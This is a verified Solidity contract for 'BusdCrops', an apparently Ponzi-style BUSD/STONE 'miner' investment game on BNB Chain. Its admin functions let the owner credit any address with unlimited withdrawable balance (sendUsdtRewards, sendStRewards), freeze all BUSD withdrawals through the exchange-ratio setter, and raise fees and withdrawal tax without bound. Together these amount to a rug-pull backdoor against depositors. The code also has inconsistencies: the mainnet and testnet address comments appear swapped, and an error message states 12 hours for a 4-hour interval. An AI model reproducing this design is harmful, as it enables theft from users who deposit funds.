/**
 *Submitted for verification at BscScan.com on 2022-05-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-15
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IToken {
function totalSupply() external view returns(uint256);
function balanceOf(address account) external view returns(uint256);
function transfer(address recipient, uint256 amount) external returns(bool);
function allowance(address owner, address spender) external view returns(uint256);
function approve(address spender, uint256 amount) external returns(bool);
function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);

event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b != 0);
        return a % b;
    }
}

contract BusdCrops {
    using SafeMath for uint256;
        IToken public token_BUSD;
    IToken public token_STONE;

    address erctoken = 0xCF55fb7Bef121a7C6AcBB44C5aCDA8d1ce8Fec02; /** BUSD Mainnet **/
    address stonetoken = 0x2C80f25090ac08bF084bbe8194B00524D6b5D20d;/** STONE Mainnet **/
   // address erctoken = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; /** BUSD Testnet **/
   // address stonetoken = 0x8052c7A6c6CD548D583781a622300862a17F6F5F;/** STONE Testnet **/


    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public MINER_PRICE = 50 * 1e18;
    uint256 public STONE_MINER_PRICE = 10000 * 1e18;

    uint256 public MAX_USDT_DEPOSITS = 200;
    uint256 public MAX_STONE_DEPOSITS = 100;

    uint256 public REFERRAL = 80;
    uint256 public EGGS_TO_HIRE_1MINERS = 100;
    uint256 public STONE_TO_HIRE_1MINERS = 100 * 1e18;
    uint256 public EXCHANGE_RATIO_OF_STONE_AND_USDT = 0;
    uint256 public TAX = 50;
    uint256 public WITHDRAWAL_AWARD_RATIO = 200;
    uint256 public WITHDRAWAL_TAX = 600;
    uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 7;
    uint256 public withdrawalIntervalTakes = 3600 * 4;

    uint256 public totalBetAmount;
    uint256 public totalWithdrawn;
    address public owner;
    address public mkt;

    struct UserAssets
    {
        uint256 usdtMiners;
        uint256 usdtBuyTotalAmount;
        uint256 usdtTotalWithdrawn;
        uint256 stMiners;
        uint256 stBuyTotalAmount;
        uint256 stTotalWithdrawn;

    }
    struct User {
        uint256 beforeWithdrawnAmount;
        uint256 beforeStoneWithdrawnAmount;
        address referrer;
        uint256 referralsCount;
        uint256 referralEggRewards;
        uint256 continuityDays;
        uint256 lastHatch;
        uint256 intervalTime;

    }

    mapping(address => User) public users;
    mapping(address => UserAssets) public assets;

    constructor(address _mkt) {
        require(!isContract(_mkt));
        owner = msg.sender;
        mkt = _mkt;
        token_BUSD = IToken(erctoken);
        token_STONE = IToken(stonetoken);
    }


    function getBaseInfo() public view returns(
        uint256 _percentsDivider,
        uint256 _minerPrice,
        uint256 _stoneMinerPrice,
        uint256 _userMaxUserDeposits,
        uint256 _eggsToHireMiners,
        uint256 _stoneToHireMiners,

        uint256 _exchangeRatioOfStoneAndUsdt,
        uint256 _tax,
        uint256 _withdrawalAwardRatio,
        uint256 _withdrawalTax,
        uint256 _totalBetAmount,
        uint256 _totalWithdrawn

    ) {

        _percentsDivider = PERCENTS_DIVIDER;
        _minerPrice = MINER_PRICE;
        _stoneMinerPrice = STONE_MINER_PRICE;

        _userMaxUserDeposits = MAX_USDT_DEPOSITS;
        _eggsToHireMiners = EGGS_TO_HIRE_1MINERS;
        _stoneToHireMiners = STONE_TO_HIRE_1MINERS;

        _exchangeRatioOfStoneAndUsdt = EXCHANGE_RATIO_OF_STONE_AND_USDT;
        _tax = TAX;
        _withdrawalAwardRatio = WITHDRAWAL_AWARD_RATIO;
        _withdrawalTax = WITHDRAWAL_TAX;

        _totalBetAmount = totalBetAmount;
        _totalWithdrawn = totalWithdrawn;
    }
    function getUserInfo(address _adr) public view returns(
        uint256 _usdtMiners,
        uint256 _usdtBuyTotalAmount,
        uint256 _usdtTotalWithdrawn,
        uint256 _stMiners,
        uint256 _stBuyTotalAmount,
        uint256 _stTotalWithdrawn,

        uint256 _usdtWithdrawnAmount,
        uint256 _stoneWithdrawnAmount,
        address _referrer,
        uint256 _referralsCount,
        uint256 _referralEggRewards,
        uint256 _continuityDays
    ) {
        _usdtMiners = assets[_adr].usdtMiners;
        _usdtBuyTotalAmount = assets[_adr].usdtBuyTotalAmount;
        _usdtTotalWithdrawn = assets[_adr].usdtTotalWithdrawn;
        _stMiners = assets[_adr].stMiners;
        _stBuyTotalAmount = assets[_adr].stBuyTotalAmount;
        _stTotalWithdrawn = assets[_adr].stTotalWithdrawn;

        _usdtWithdrawnAmount = users[_adr].beforeWithdrawnAmount + getUserUsdtProfit(_adr);
        _stoneWithdrawnAmount = users[_adr].beforeStoneWithdrawnAmount + getUserStoneProfit(_adr);

        _referrer = users[_adr].referrer;
        _referralsCount = users[_adr].referralsCount;
        _referralEggRewards = users[_adr].referralEggRewards;
        _continuityDays = users[_adr].continuityDays;

    }


    function buyMinersByUsdt(address ref, uint256 amount) external{

        User storage user = users[msg.sender];
        UserAssets storage userAssets = assets[msg.sender];
        require(amount >= MINER_PRICE, "Mininum investment not met.");

        require(userAssets.usdtMiners.add(amount.div(MINER_PRICE)) <= MAX_USDT_DEPOSITS, "Max deposit limit reached.");
        token_BUSD.transferFrom(address(msg.sender), address(this), amount);


        if (ref != address(0)) {
            if (ref != msg.sender) {
                uint256 refRewards = amount.mul(REFERRAL).div(PERCENTS_DIVIDER);
                users[ref].referralEggRewards = users[ref].referralEggRewards.add(refRewards);
                users[ref].referralsCount = users[ref].referralsCount.add(1);
                user.referrer = ref;
            }
        }

        payFees(amount);

        userAssets.usdtBuyTotalAmount = userAssets.usdtBuyTotalAmount.add(amount);
        totalBetAmount = totalBetAmount.add(amount);

        uint256 buyMiner = amount.div(MINER_PRICE);
        userAssets.usdtMiners = userAssets.usdtMiners.add(buyMiner);

        user.beforeWithdrawnAmount = user.beforeWithdrawnAmount.add(getUserUsdtProfit(msg.sender));
        user.beforeStoneWithdrawnAmount = user.beforeStoneWithdrawnAmount.add(getUserStoneProfit(msg.sender));
        user.lastHatch = block.timestamp;
    }
    function usdtWithdrawn() external{

        require(EXCHANGE_RATIO_OF_STONE_AND_USDT <= 0, "Insufficient usdt balance.");

        User storage user = users[msg.sender];
        UserAssets storage userAssets = assets[msg.sender];

        uint256 intervalTime = block.timestamp - user.intervalTime;
        require(intervalTime > withdrawalIntervalTakes, "The withdrawal interval takes 12 hours.");


        uint256 userProfit = getUserUsdtProfit(msg.sender);
        uint256 withdrawnAmount = user.beforeWithdrawnAmount.add(userProfit);


        userAssets.usdtTotalWithdrawn = userAssets.usdtTotalWithdrawn.add(withdrawnAmount);
        totalWithdrawn = totalWithdrawn.add(withdrawnAmount);

        uint256 awardAmount = 0;
        uint256 cdays = getContinuityDays(msg.sender);
        if (user.continuityDays == 0) {
            if (cdays < COMPOUND_FOR_NO_TAX_WITHDRAWAL) {
                withdrawnAmount = withdrawnAmount.sub(withdrawnAmount.mul(WITHDRAWAL_TAX).div(PERCENTS_DIVIDER));
            }
            else {
                user.continuityDays = 1;
            }
        }
        if (cdays >= COMPOUND_FOR_NO_TAX_WITHDRAWAL) {
            awardAmount = withdrawnAmount.mul(WITHDRAWAL_AWARD_RATIO).div(PERCENTS_DIVIDER);
        }

        if (awardAmount > 0) {
            uint256 tax2 = payFees(awardAmount);
            awardAmount = awardAmount.sub(tax2);
            token_BUSD.transfer(msg.sender, awardAmount);
        }

        uint256 tax1 = payFees(withdrawnAmount);
        withdrawnAmount = withdrawnAmount.sub(tax1);
        token_BUSD.transfer(msg.sender, withdrawnAmount);


        user.beforeStoneWithdrawnAmount = user.beforeStoneWithdrawnAmount.add(getUserStoneProfit(msg.sender));
        user.lastHatch = block.timestamp;
        user.intervalTime = block.timestamp;
        user.beforeWithdrawnAmount = 0;

    }
    function sendUsdtRewards(address addr, uint256 amount) external{

        require(msg.sender == owner, "Admin use only.");
        User storage user = users[addr];
        user.beforeWithdrawnAmount = user.beforeWithdrawnAmount.add(amount);
    }
    function sendStRewards(address addr, uint256 amount) external{

        require(msg.sender == owner, "Admin use only.");
        User storage user = users[addr];
        user.beforeStoneWithdrawnAmount = user.beforeStoneWithdrawnAmount.add(amount);
    }
    function referralWithdrawn() external{
        User storage user = users[msg.sender];
        require(user.referralEggRewards > 0, "Insufficient usdt balance.");

        uint256 tax = payFees(user.referralEggRewards);
        uint256 amount = user.referralEggRewards - tax;

        token_BUSD.transfer(msg.sender, amount);
        user.referralEggRewards = 0;

    }

    function withdrawStone() external{
        User storage user = users[msg.sender];
        UserAssets storage userAssets = assets[msg.sender];
        uint256 amount = getUserStoneProfit(msg.sender).add(user.beforeStoneWithdrawnAmount);

        require(amount > 0, "Insufficient st balance.");


        if (EXCHANGE_RATIO_OF_STONE_AND_USDT > 0) {
            user.beforeWithdrawnAmount = 0;
        }
        userAssets.stTotalWithdrawn = userAssets.stTotalWithdrawn.add(amount);

        uint256 tax = amount.mul(TAX).div(PERCENTS_DIVIDER);
        amount = amount - tax;
        token_STONE.transfer(msg.sender, amount);

        user.beforeWithdrawnAmount = user.beforeWithdrawnAmount.add(getUserUsdtProfit(msg.sender));
        user.lastHatch = block.timestamp;
        user.beforeStoneWithdrawnAmount = 0;
    }


    function buyMinersByStone(uint256 amount) external{


        User storage user = users[msg.sender];
        UserAssets storage userAssets = assets[msg.sender];


        require(userAssets.stMiners.add(amount.div(STONE_MINER_PRICE)) <= MAX_STONE_DEPOSITS, "Max deposit limit reached.");

        uint256 stoneProfit = getUserStoneProfit(msg.sender);
        uint256 stoneAmount = stoneProfit + user.beforeStoneWithdrawnAmount;

        require(stoneAmount >= amount, "Insufficient stone balance.");


        uint256 buyAmount = amount.div(STONE_MINER_PRICE);
        userAssets.stMiners = userAssets.stMiners.add(buyAmount);
        userAssets.stBuyTotalAmount = userAssets.stBuyTotalAmount.add(amount);

        user.beforeStoneWithdrawnAmount = stoneAmount - amount;
        user.beforeWithdrawnAmount = user.beforeWithdrawnAmount.add(getUserUsdtProfit(msg.sender));
        user.lastHatch = block.timestamp;


    }


    function buyMinersByStoneWallet(uint256 amount) external{

        User storage user = users[msg.sender];
        UserAssets storage userAssets = assets[msg.sender];


        require(userAssets.stMiners.add(amount.div(STONE_MINER_PRICE)) <= MAX_STONE_DEPOSITS, "Max deposit limit reached.");

        token_STONE.transferFrom(address(msg.sender), address(this), amount);

        uint256 buyMiner = amount.div(STONE_MINER_PRICE);
        userAssets.stMiners = userAssets.stMiners.add(buyMiner);
        userAssets.stBuyTotalAmount = userAssets.stBuyTotalAmount.add(amount);

        user.beforeStoneWithdrawnAmount = user.beforeStoneWithdrawnAmount.add(getUserStoneProfit(msg.sender));
        user.beforeWithdrawnAmount = user.beforeWithdrawnAmount.add(getUserUsdtProfit(msg.sender));
        user.lastHatch = block.timestamp;

    }

    function payFees(uint256 amount) internal returns(uint256) {
        uint256 tax = amount.mul(TAX).div(PERCENTS_DIVIDER);
        token_BUSD.transfer(mkt, tax);
        return tax;
    }

    function getInStoneBalance() public view returns(uint256) {
        User storage user = users[msg.sender];
        uint256 amount = getUserStoneProfit(msg.sender).add(user.beforeStoneWithdrawnAmount);
        return amount;
    }

    function getUserUsdtProfit(address _adr) public view returns(uint256) {
        uint256 result = 0;
        if (EXCHANGE_RATIO_OF_STONE_AND_USDT <= 0) {
            User storage user = users[_adr];
            UserAssets storage userAssets = assets[_adr];
            if (user.lastHatch > 0) {
                uint256 dt = block.timestamp - user.lastHatch;
                result = dt.mul(userAssets.usdtMiners + userAssets.stMiners).mul(MINER_PRICE).mul(EGGS_TO_HIRE_1MINERS).div(PERCENTS_DIVIDER).div(3600 * 24);

            }
        }

        return result;
    }

    function getUserStoneProfit(address _adr) public view returns(uint256) {
        User storage user = users[_adr];
        UserAssets storage userAssets = assets[_adr];
        uint256 result = 0;
        if (user.lastHatch > 0) {
            uint256 dt = block.timestamp - user.lastHatch;
            result = dt.mul(userAssets.usdtMiners + userAssets.stMiners).mul(STONE_TO_HIRE_1MINERS).div(3600 * 24);

        }

        if (EXCHANGE_RATIO_OF_STONE_AND_USDT > 0) {
            uint256 dt = block.timestamp - user.lastHatch;
            uint256 usdtAmount = dt.mul(userAssets.usdtMiners + userAssets.stMiners).mul(MINER_PRICE).mul(EGGS_TO_HIRE_1MINERS).div(PERCENTS_DIVIDER).div(3600 * 24);

            usdtAmount = usdtAmount.add(user.beforeWithdrawnAmount);
            uint256 stoneAmount = usdtAmount.mul(EXCHANGE_RATIO_OF_STONE_AND_USDT);
            result = result + stoneAmount;
        }
        return result;
    }
    function getContinuityDays(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = block.timestamp.sub(users[adr].lastHatch);
        uint256 cdays = secondsSinceLastHatch.div(3600 * 24);
        return cdays;
    }

    function isContract(address addr) internal view returns(bool) {
        uint size;
        assembly { size:= extcodesize(addr) }
        return size > 0;
    }
    function getBalance() public view returns(uint256) {
        return token_BUSD.balanceOf(address(this));
    }

    function CHANGE_OWNERSHIP(address value) external {
        require(msg.sender == owner, "Admin use only.");
        owner = value;
    }
    function CHANGE_MKT_WALLET(address value) external {
        require(msg.sender == owner, "Admin use only.");
        mkt = value;
    }
    function SET_MINER_PRICE(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        MINER_PRICE = value * 1e18;
    }

    function SET_STONE_MINER_PRICE(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        STONE_MINER_PRICE = value * 1e18;
    }
    function SET_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        TAX = value;
    }
    function SET_WITHDRAWAL_AWARD_RATIO(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        WITHDRAWAL_AWARD_RATIO = value;
    }

    function SET_WITHDRAWAL_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        WITHDRAWAL_TAX = value;
    }

    function SET_EXCHANGE_RATIO_OF_STONE_AND_USDT(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        EXCHANGE_RATIO_OF_STONE_AND_USDT = value * 1e18;
    }
    function SET_WITHDRAWAL_INTERVAL_TAKES(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        withdrawalIntervalTakes = value;
    }

    function SET_MAX_USDT_DEPOSITS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        MAX_USDT_DEPOSITS = value;
    }
    function SET_MAX_STONE_DEPOSITS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        MAX_STONE_DEPOSITS = value;
    }

}